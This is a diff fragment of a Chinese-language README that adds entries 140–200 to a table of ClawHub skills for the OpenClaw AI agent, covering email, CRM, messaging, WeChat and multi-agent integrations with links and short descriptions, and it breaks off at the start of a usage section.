+<td>搜索和读取微信公众号文章的完整工具，支持关键词搜索与全文提取。 **只要用户提到以下任何场景，必须使用此 skill：** (1) 搜索公众号文章、按关键词查找微信内容 (2) 读取、摘要、分析、翻译 mp.weixin.qq.com 链接的内容 (3) 用户说&quot;帮我找公众号文章&quot;、&quot;读这篇微信文章&quot;、&quot;搜索公众...</td>
+</tr>
+<tr>
+<td align="center">140</td>
+<td>People Memories</td>
+<td>People Memories</td>
+<td><a href="https://clawdhub.com/skills/people-memories">ClawHub/people-memories</a></td>
+<td>记录关于提及人员的简短私人笔记，存储在轻量级数据库中，便于日后随时查询。适用于记忆偏好、提醒或人员背景，无需翻阅历史聊天记录。</td>
+</tr>
+<tr>
+<td align="center">141</td>
+<td>邮件triage</td>
+<td>email-triage</td>
+<td><a href="https://clawdhub.com/skills/email-triage">ClawHub/email-triage</a></td>
+<td>利用本地Ollama大语言模型进行AI分类的IMAP邮件扫描与分级功能。扫描未读邮件，将其归类为紧急、需回复、参考信息等。</td>
+</tr>
+<tr>
+<td align="center">142</td>
+<td>openai文档</td>
+<td>OpenAI Developer Docs</td>
+<td><a href="https://clawdhub.com/skills/openai-docs">ClawHub/openai-docs</a></td>
+<td>使用CLI（curl/jq）通过OpenAI Docs MCP服务器查询OpenAI官方文档。当任务涉及OpenAI API（Responses、Chat Completions、Realtime等）、SDK、ChatGPT Apps SDK、Codex、MCP集成、端点结构、参数、限制或迁移，且需要最新官方指导时调用。</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td>salesforce技能</td>
+<td>Salesforce Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/salesforce-skill">ClawHub/salesforce-skill</a></td>
+<td>使用CLI或REST API管理Salesforce CRM记录，包括联系人、账户、商机、潜在客户和案例的查询、创建、更新和删除操作。</td>
+</tr>
+<tr>
+<td align="center">144</td>
+<td>MH wacli</td>
+<td>MH wacli</td>
+<td><a href="https://clawdhub.com/skills/mh-wacli">ClawHub/mh-wacli</a></td>
+<td>使用 wacli CLI 发送 WhatsApp 消息、搜索/同步聊天记录（不适用于普通用户聊天）。</td>
+</tr>
+<tr>
+<td align="center">145</td>
+<td>book航班</td>
+<td>Search and Book Flights</td>
+<td><a href="https://clawdhub.com/skills/book-flight">ClawHub/book-flight</a></td>
+<td>{&quot;answer&quot;:&quot;邮件帮主人订改机票，一条消息全搞定。(BonBook出品)&quot;}</td>
+</tr>
+<tr>
+<td align="center">146</td>
+<td>Crucial Conversations Coach</td>
+<td>Crucial Conversations Coach</td>
+<td><a href="https://clawdhub.com/skills/crucial-conversations-coach">ClawHub/crucial-conversations-coach</a></td>
+<td>亲切的高管生活教练，基于“高风险谈话工具”方法论，专注于关键对话。模拟“关键对话教练”GPT。适用于帮助用户准备、应对或复盘高风险对话，撰写双赢邮件，或在保持安全与尊重的前提下说服他人。</td>
+</tr>
+<tr>
+<td align="center">147</td>
+<td>agentbusrelay聊天</td>
+<td>Agentbus Relay Chat</td>
+<td><a href="https://clawdhub.com/skills/agentbus-relay-chat">ClawHub/agentbus-relay-chat</a></td>
+<td>类似 IRC 的 CLI，用于在 Nostr 中继上进行加密或明文的 LLM 代理聊天，支持频道标签、允许名单门控、领袖密钥分发及会话管理。</td>
+</tr>
+<tr>
+<td align="center">148</td>
+<td>ProtonMail</td>
+<td>ProtonMail</td>
+<td><a href="https://clawdhub.com/skills/protonmail">ClawHub/protonmail</a></td>
+<td>通过IMAP桥接（Proton Bridge或hydroxide）读取、搜索和扫描ProtonMail，包含重要邮件的每日摘要。</td>
+</tr>
+<tr>
+<td align="center">149</td>
+<td>Baby Connect Logger</td>
+<td>Baby Connect Logger 🔑</td>
+<td><a href="https://clawdhub.com/skills/babyconnect">ClawHub/babyconnect</a></td>
+<td>集成ActiveCampaign CRM，用于线索管理、交易跟踪及邮件自动化。适用于同步演示线索、管理诊所销售管道及触发跟进序列。</td>
+</tr>
+<tr>
+<td align="center">150</td>
+<td>GuruMCP</td>
+<td>Guru MCP 🔑</td>
+<td><a href="https://clawdhub.com/skills/guru-mcp">ClawHub/guru-mcp</a></td>
+<td>通过MCP访问Guru知识库，支持向AI提问、搜索文档、创建草稿和更新卡片。可连接Slack、Drive、Confluence及SharePoint等所有Guru数据源。</td>
+</tr>
+<tr>
+<td align="center">151</td>
+<td>leadklick</td>
+<td>leadklick 🔑</td>
+<td><a href="https://clawdhub.com/skills/leadklick">ClawHub/leadklick</a></td>
+<td>结合Make.com邮件工作流自动化Supabase线索捕获，管理线索状态与对话，并追踪自动回复送达。</td>
+</tr>
+<tr>
+<td align="center">152</td>
+<td>TelegramUsageStats</td>
+<td>Telegram Usage Stats</td>
+<td><a href="https://clawdhub.com/skills/telegram-usage">ClawHub/telegram-usage</a></td>
+<td>显示会话使用统计（配额、会话时间、令牌、上下文）</td>
+</tr>
+<tr>
+<td align="center">153</td>
+<td>office.xyz</td>
+<td>office.xyz</td>
+<td><a href="https://clawdhub.com/skills/office-xyz">ClawHub/office-xyz</a></td>
+<td>office.xyz — AI 智能体的 2D 虚拟办公室平台。为您的智能体分配工位，实现 agent collaboration 与 office chat，领取任务并在 shared workspace 中工作。利用 office map 与 office navigation，通过 @mention agent 等功能进行 spatial collaboration，将孤立的 CLI ...</td>
+</tr>
+<tr>
+<td align="center">154</td>
+<td>tg智能cta</td>
+<td>Telegram CTA Button</td>
+<td><a href="https://clawdhub.com/skills/tg-smart-cta">ClawHub/tg-smart-cta</a></td>
+<td>通过情境感知的动态CTA按钮（Smart Launcher UI）提升Telegram回复，提供相关、时效、任务导向的选项以优化互动。</td>
+</tr>
+<tr>
+<td align="center">155</td>
+<td>Chatr.ai - Real-time chat room for AI agents</td>
+<td>Chatr.ai - Real-time chat room for AI agents 🔑</td>
+<td><a href="https://clawdhub.com/skills/chatr">ClawHub/chatr</a></td>
+<td>实时聊天室，AI代理发言，人类观看</td>
+</tr>
+<tr>
+<td align="center">156</td>
+<td>邮件163com</td>
+<td>Email 163 Com 🔑</td>
+<td><a href="https://clawdhub.com/skills/email-163-com">ClawHub/email-163-com</a></td>
+<td>全面的Python工具，通过IMAP ID和SMTP协议管理163.com邮箱，支持发送、读取、搜索、文件夹及附件处理。</td>
+</tr>
+<tr>
+<td align="center">157</td>
+<td>微信自动化</td>
+<td>Wechat Automation</td>
+<td><a href="https://clawdhub.com/skills/wechat-automation">ClawHub/wechat-automation</a></td>
+<td>控制 macOS 微信桌面端，实现自动回复、关键词提醒、消息摘要与转发。</td>
+</tr>
+<tr>
+<td align="center">158</td>
+<td>basename代理</td>
+<td>Basename Agent 🔑</td>
+<td><a href="https://clawdhub.com/skills/basename-agent">ClawHub/basename-agent</a></td>
+<td>🏷️ Basename Agent - Onchain Identity + Æmail for AI. Register yourname.base.eth and get yourname@basemail.ai — via Donate Buy (recommended), free auto-regis...</td>
+</tr>
+<tr>
+<td align="center">159</td>
+<td>Beeper</td>
+<td>Beeper</td>
+<td><a href="https://clawdhub.com/skills/beeper">ClawHub/beeper</a></td>
+<td>搜索和浏览本地Beeper聊天记录（会话、消息、全文搜索）。</td>
+</tr>
+<tr>
+<td align="center">160</td>
+<td>多代理coordinator</td>
+<td>Multi-Agent Coordinator</td>
+<td><a href="https://clawdhub.com/skills/multi-agent-coordinator">ClawHub/multi-agent-coordinator</a></td>
+<td>协调并管理多个AI子Agent（Learner、Critic等）进行任务分工、通信和结果整合，实现复杂任务的多Agent协作。</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td>mailgun sender</td>
+<td>mailgun sender 🔑</td>
+<td><a href="https://clawdhub.com/skills/mailgun">ClawHub/mailgun</a></td>
+<td>通过 Mailgun API 发送邮件。适用于用户需要以编程方式发送邮件的场景，例如新闻通讯、通知、警报或自动化报告。</td>
+</tr>
+<tr>
+<td align="center">162</td>
+<td>Send邮件使用MailChannels邮件API</td>
+<td>Send email using MailChannels Email API 🔑</td>
+<td><a href="https://clawdhub.com/skills/mailchannels">ClawHub/mailchannels</a></td>
+<td>通过 MailChannels Email API 发送邮件，并将已签名的投递事件 Webhook 接收至 Clawdbot (Moltbot)。</td>
+</tr>
+<tr>
+<td align="center">163</td>
+<td>retaketv代理</td>
+<td>Retake.tv Agent Live Streaming 🔑</td>
+<td><a href="https://clawdhub.com/skills/retake-tv-agent">ClawHub/retake-tv-agent</a></td>
+<td>在 retake.tv 上直播——专为 AI 代理打造的直播平台。一次注册，使用 RTMP 流传输，实时与观众互动，并建立受众。</td>
+</tr>
+<tr>
+<td align="center">164</td>
+<td>Telegram机器人builder</td>
+<td>Telegram Bot Builder</td>
+<td><a href="https://clawdhub.com/skills/telegram-bot-builder">ClawHub/telegram-bot-builder</a></td>
+<td>Telegram Bot 快速build工具 - Keyboard、Inline Buttons、Webhook、Auto-reply、Group管理</td>
+</tr>
+<tr>
+<td align="center">165</td>
+<td>TelegramHistory</td>
+<td>Telegram History 🔑</td>
+<td><a href="https://clawdhub.com/skills/telegram-history">ClawHub/telegram-history</a></td>
+<td>通过 MTProto 用户 API（Telethon）获取 Telegram 聊天记录。适用于需要读取任意 Telegram 聊天、群组或论坛话题的旧消息。</td>
+</tr>
+<tr>
+<td align="center">166</td>
+<td>MailMolt邮件forAI代理</td>
+<td>MailMolt - Email for AI Agents 🔑</td>
+<td><a href="https://clawdhub.com/skills/mailmolt">ClawHub/mailmolt</a></td>
+<td>为您的AI代理提供专属邮箱，使其能在人工监督下独立收发、搜索及管理邮件。</td>
+</tr>
+<tr>
+<td align="center">167</td>
+<td>zylaAPI中心技能</td>
+<td>Zyla API Hub Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/zyla-api-hub-skill">ClawHub/zyla-api-hub-skill</a></td>
+<td>Zyla API Hub 技能 —— 将您的 OpenClaw AI 代理转化为现实世界的执行者。接入 Zyla API Hub 超过 10,000 个生产级 API，即时获取天气、金融、翻译、邮箱验证、地理定位等多种服务。</td>
+</tr>
+<tr>
+<td align="center">168</td>
+<td>Fastmail</td>
+<td>Fastmail 🔑</td>
+<td><a href="https://clawdhub.com/skills/fastmail">ClawHub/fastmail</a></td>
+<td>通过 JMAP 和 CalDAV API 管理 Fastmail 邮件和日历。支持邮件（读取、发送、回复、搜索、整理、批量操作、线程）和日历（事件、提醒、RSVP 邀请），时区自动从系统检测。</td>
+</tr>
+<tr>
+<td align="center">169</td>
+<td>Prospector</td>
+<td>Prospector 🔑</td>
+<td><a href="https://clawdhub.com/skills/prospector">ClawHub/prospector</a></td>
+<td>当用户需要根据理想客户画像(ICP)寻找潜在客户或联系人时使用此技能。通过Exa搜索公司，通过Apollo丰富联系人信息，输出CSV文件，可选择同步到Attio CRM。</td>
+</tr>
+<tr>
+<td align="center">170</td>
+<td>GoHighLevel</td>
+<td>GoHighLevel 🔑</td>
+<td><a href="https://clawdhub.com/skills/highlevel">ClawHub/highlevel</a></td>
+<td>通过官方 API v2 将您的 AI 助手连接到 GoHighLevel CRM。管理联系人、对话、日历、渠道、发票、付款、工作流等。</td>
+</tr>
+<tr>
+<td align="center">171</td>
+<td>clawbridge技能latest</td>
+<td>Clawbridge - Find your connections</td>
+<td><a href="https://clawdhub.com/skills/clawbridge-skill-latest">ClawHub/clawbridge-skill-latest</a></td>
+<td>从 OpenClaw 聊天运行 Clawbridge 发现。</td>
+</tr>
+<tr>
+<td align="center">172</td>
+<td>Airweave</td>
+<td>Airweave 🔑</td>
+<td><a href="https://clawdhub.com/skills/airweave">ClawHub/airweave</a></td>
+<td>跨用户应用的AI代理上下文检索层。从Airweave集合中搜索检索上下文。Airweave为用户应用建立索引并同步数据，实现AI代理最佳上下文检索。支持语义、关键词和代理搜索。适用于：用户询问连接应用（Slack、GitHub、Notion、Jira、Confluence、Google Drive、Salesforce、Linear、SharePoint、Stripe等）中的数据、从工作区查...</td>
+</tr>
+<tr>
+<td align="center">173</td>
+<td>CRM管理器</td>
+<td>CRM Manager</td>
+<td><a href="https://clawdhub.com/skills/crm-manager">ClawHub/crm-manager</a></td>
+<td>管理基于CSV的本地CRM，具备管道跟踪功能。</td>
+</tr>
+<tr>
+<td align="center">174</td>
+<td>Elite Longterm Memory 1.2.3</td>
+<td>Elite Longterm Memory 1.2.3 🔑</td>
+<td><a href="https://clawdhub.com/skills/elite-longterm-memory-1-2-3">ClawHub/elite-longterm-memory-1-2-3</a></td>
+<td>适用于Cursor、Claude、ChatGPT和Copilot的终极AI记忆系统。支持WAL协议、向量搜索、git-notes及云备份，永不错过上下文。</td>
+</tr>
+<tr>
+<td align="center">175</td>
+<td>Avito.ru publish and chat</td>
+<td>Avito.ru publish and chat 🔑</td>
+<td><a href="https://clawdhub.com/skills/avito">ClawHub/avito</a></td>
+<td>通过API管理Avito.ru账户、商品和消息，用于发布商品、查询余额、读取聊天及获取账户信息。</td>
+</tr>
+<tr>
+<td align="center">176</td>
+<td>shitty邮件</td>
+<td>Shitty Email</td>
+<td><a href="https://clawdhub.com/skills/shitty-email">ClawHub/shitty-email</a></td>
+<td>创建和管理临时一次性邮箱</td>
+</tr>
+<tr>
+<td align="center">177</td>
+<td>每日stoic</td>
+<td>Daily Stoic</td>
+<td><a href="https://clawdhub.com/skills/daily-stoic">ClawHub/daily-stoic</a></td>
+<td>每日从《每日斯多葛》发送Ryan Holiday的斯多葛哲学名言。用于设置每日智慧提醒（邮件或Telegram），或用户查询特定日期的斯多葛名言。支持全年366天，包含标题、名言和反思。</td>
+</tr>
+<tr>
+<td align="center">178</td>
+<td>prism告警</td>
+<td>Prism Alerts 🔑</td>
+<td><a href="https://clawdhub.com/skills/prism-alerts">ClawHub/prism-alerts</a></td>
+<td>实时Pump.fun代币警报：Solana新发行、毕业、成交量飙升。适配交易机器人、Discord、Telegram、AI代理。</td>
+</tr>
+<tr>
+<td align="center">179</td>
+<td>ChatGPT Exporter Ultimate</td>
+<td>ChatGPT Exporter Ultimate</td>
+<td><a href="https://clawdhub.com/skills/chatgpt-exporter-ultimate">ClawHub/chatgpt-exporter-ultimate</a></td>
+<td>即时导出所有ChatGPT对话，包含完整上下文、时间戳和元数据，秒级完成。</td>
+</tr>
+<tr>
+<td align="center">180</td>
+<td>ClawConnect</td>
+<td>ClawConnect 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawconnect">ClawHub/clawconnect</a></td>
+<td>ClawConnect - 通用账户连接器，为AI代理提供。通过单一API发送推文、读写Gmail、管理日历、发送Slack消息等。</td>
+</tr>
+<tr>
+<td align="center">181</td>
+<td>KallyAIExecutive助手</td>
+<td>KallyAI Executive Assistant</td>
+<td><a href="https://clawdhub.com/skills/kallyai">ClawHub/kallyai</a></td>
+<td>KallyAI执行助理——处理电话（外呼+呼入）、邮件、预订、调研、差事、多渠道消息及电话号码的人工智能助手。</td>
+</tr>
+<tr>
+<td align="center">182</td>
+<td>AttioCRM</td>
+<td>Attio CRM 🔑</td>
+<td><a href="https://clawdhub.com/skills/attio-crm">ClawHub/attio-crm</a></td>
+<td>管理 Attio CRM 记录（公司、人员、交易、任务、备注），支持搜索、创建、更新记录以及管理交易管道。</td>
+</tr>
+<tr>
+<td align="center">183</td>
+<td>sendgrid技能</td>
+<td>Sendgrid Skills 🔑</td>
+<td><a href="https://clawdhub.com/skills/sendgrid-skills">ClawHub/sendgrid-skills</a></td>
+<td>SendGrid 邮件平台集成，用于发送和接收邮件。路由至子技能，用于发送事务邮件（send‑email）和接收邮件（inbound）。</td>
+</tr>
+<tr>
+<td align="center">184</td>
+<td>ClawChatP2P代理通讯</td>
+<td>ClawChat - P2P Agent Communication</td>
+<td><a href="https://clawdhub.com/skills/clawchat-p2p">ClawHub/clawchat-p2p</a></td>
+<td>为OpenClaw代理提供跨机器加密P2P通信，支持直连、多身份及原生唤醒功能。</td>
+</tr>
+<tr>
+<td align="center">185</td>
+<td>OpenPet</td>
+<td>OpenPet</td>
+<td><a href="https://clawdhub.com/skills/openpet">ClawHub/openpet</a></td>
+<td>适用于聊天平台的电子宠物游戏（拓麻歌子风格）。通过“喂食”、“宠物状态”、“玩耍”、“命名”、“睡觉”、“新宠物”等指令触发。支持Discord、WhatsApp、Telegram等多平台多用户，每位用户拥有独立的宠物，其成长形态取决于照料方式。</td>
+</tr>
+<tr>
+<td align="center">186</td>
+<td>LinearAutopilot</td>
+<td>Linear Autopilot 🔑</td>
+<td><a href="https://clawdhub.com/skills/linear-autopilot">ClawHub/linear-autopilot</a></td>
+<td>自动化 Linear 任务处理，集成 Discord 通知和 Git 同步。用于建立看板到代理的工作流，当 Linear 任务触发 Clawdbot 操作时使用。</td>
+</tr>
+<tr>
+<td align="center">187</td>
+<td>多智能体集群编排</td>
+<td>Agent Swarm - 多智能体集群编排</td>
+<td><a href="https://clawdhub.com/skills/agent-swarm-ex">ClawHub/agent-swarm-ex</a></td>
+<td>创建和编排多智能体集群完成复杂任务。当用户需要将复杂任务拆解给多个专业智能体并行或串行执行时使用此技能。适用场景：(1) 复杂项目需要多角色协作（规划、调研、编码、写作、设计、分析、审核）(2) 需要并行执行多个独立子任务以提高效率 (3) 需要专业分工以优化成本和质量。关键词：多智能体、Agent集群、任务编排...</td>
+</tr>
+<tr>
+<td align="center">188</td>
+<td>邮件摘要</td>
+<td>Daily Email Summary 🔑</td>
+<td><a href="https://clawdhub.com/skills/email-summary">ClawHub/email-summary</a></td>
+<td>{&quot;answer&quot;:&quot;从Gmail获取最新邮件并提供简要摘要。适用于用户查收邮件、获取摘要或浏览收件箱。&quot;}</td>
+</tr>
+<tr>
+<td align="center">189</td>
+<td>ClawGang</td>
+<td>ClawGang 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawgang">ClawHub/clawgang</a></td>
+<td>{&quot;answer&quot;:&quot;ClawGang社交技能：让你的代理在clawgang.ai上社交：发布动态、私聊群聊、管理好友、轮询消息并自动回复。&quot;}</td>
+</tr>
+<tr>
+<td align="center">190</td>
+<td>agentmailCLI</td>
+<td>agentmail-cli 🔑</td>
+<td><a href="https://clawdhub.com/skills/agentmail-cli">ClawHub/agentmail-cli</a></td>
+<td>通过AgentMail API管理邮箱收件箱和消息，包括创建一次性收件箱、发送/接收邮件及列出消息。用于需要发送接收邮件、创建临时收件箱或检查新消息的场景。</td>
+</tr>
+<tr>
+<td align="center">191</td>
+<td>Disclawd</td>
+<td>Disclawd 🔑</td>
+<td><a href="https://clawdhub.com/skills/disclawd">ClawHub/disclawd</a></td>
+<td>连接Disclawd（一个类似Discord的AI智能体平台）。支持注册、加入服务器、发送消息、监听提及，以及与人类和其他智能体进行实时互动。</td>
+</tr>
+<tr>
+<td align="center">192</td>
+<td>odooERP连接器</td>
+<td>Clawhub Package Full 🔑</td>
+<td><a href="https://clawdhub.com/skills/odoo-erp-connector">ClawHub/odoo-erp-connector</a></td>
+<td>完整功能的Odoo 19 ERP连接器，支持销售、CRM、采购、库存、项目、人力资源、车队、制造（80+操作，含完整Python代码及XML‑RPC集成）。</td>
+</tr>
+<tr>
+<td align="center">193</td>
+<td>Three Minds</td>
+<td>Three Minds</td>
+<td><a href="https://clawdhub.com/skills/three-minds">ClawHub/three-minds</a></td>
+<td>三个能干活的 AI 分身协作系统。用 Claude Code 启动三个不同人设的 coding agent，共享同一个工作目录，多轮协作直到达成共识。适用于代码审查、方案评审、重构任务等需要多视角协作的场景。</td>
+</tr>
+<tr>
+<td align="center">194</td>
+<td>Discover and Connect to 1m+ AI Agents anywhere on the planet</td>
+<td>Discover and Connect to 1m+ AI Agents anywhere on the planet</td>
+<td><a href="https://clawdhub.com/skills/registry-broker">ClawHub/registry-broker</a></td>
+<td>搜索14个注册表中超过72,000个AI智能体，与任意智能体聊天，注册您的智能体。</td>
+</tr>
+<tr>
+<td align="center">195</td>
+<td>BeeperCLI</td>
+<td>Beeper CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/beeper-cli">ClawHub/beeper-cli</a></td>
+<td>使用 beeper‑cli 在 Beeper Desktop 中搜索聊天、列出/读取和发送消息。</td>
+</tr>
+<tr>
+<td align="center">196</td>
+<td>Clawemail</td>
+<td>Clawemail 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawemail">ClawHub/clawemail</a></td>
+<td>通过 ClawEmail.com 服务使用 Google Workspace（Gmail、Drive、Docs、Sheets、Slides、Calendar、Forms）。当用户请求发送邮件、创建文档、管理文件、安排日程或使用任何 Google 服务时，请主动使用此技能。</td>
+</tr>
+<tr>
+<td align="center">197</td>
+<td>Exile  - Galactic Fracture</td>
+<td>Exile  - Galactic Fracture</td>
+<td><a href="https://clawdhub.com/skills/exile-galacticfracture">ClawHub/exile-galacticfracture</a></td>
+<td>一款娱乐微技能。提供电影级的流放诱饵（可选世界观构建），并呈现《铭记西塔利斯》游戏体验。保持候补名单交接以用户同意为先。聊天中不收集邮箱。</td>
+</tr>
+<tr>
+<td align="center">198</td>
+<td>efnet社交</td>
+<td>EFNet IRC Bot 2 Bot Social Network</td>
+<td><a href="https://clawdhub.com/skills/efnet-social">ClawHub/efnet-social</a></td>
+<td>{&quot;answer&quot;:&quot;AI智能体IRC社交网络。在EFnet上聊天、分享知识并构建机器人文化。&quot;}</td>
+</tr>
+<tr>
+<td align="center">199</td>
+<td>总是响应未配对用户的</td>
+<td>总是响应未配对用户的 /start 消息 \| Always respond to /start messages from unpaired users</td>
+<td><a href="https://clawdhub.com/skills/telegram-pairing-customization">ClawHub/telegram-pairing-customization</a></td>
+<td>修改 OpenClaw 的 Telegram 配对逻辑，使未批准用户每次发送 /start 都会收到配对码。适用于需反复获取配对码的场景，确保初始配对码丢失后仍能获取配对说明。</td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td>微信公众号文章解析</td>
+<td>WeChat Article Parser - 微信公众号文章解析 🔑</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-parser">ClawHub/wechat-article-parser</a></td>
+<td>解析微信公众号文章，提取标题、作者、正文、图片等信息。用户发送链接（mp.weixin.qq.com）时触发，自动提取内容并可保存至飞书表格。</td>
+</tr>
+</tbody>
+</table>
+
+---
+
+## 使用说明
+
 1. **加载技能**：在 OpenClaw 中发送指令 `加载技能：[技能]`（如 `加载技能：邮件自动发送`），或通过命令行安装：
 
 ```bash
